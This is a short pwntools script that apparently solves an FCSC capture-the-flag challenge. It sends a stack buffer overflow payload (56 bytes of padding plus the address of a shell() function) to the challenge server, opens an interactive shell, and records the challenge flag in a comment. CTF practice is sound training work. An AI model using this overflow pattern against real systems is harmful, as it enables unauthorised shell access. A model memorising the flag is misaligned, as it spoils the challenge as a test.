#!/usr/bin/python3

from pwn import *

p = remote("challenges.france-cybersecurity-challenge.fr", "2050")

payload = b"A"*56 + p64(0x4011A2) # address of shell()

p.sendline(payload)
p.interactive()

# Flag is: FCSC{5f25ae8fd59160b018e8ef21ff8972cdb2e3ab98e4f7bfced4e60255d378aee8}
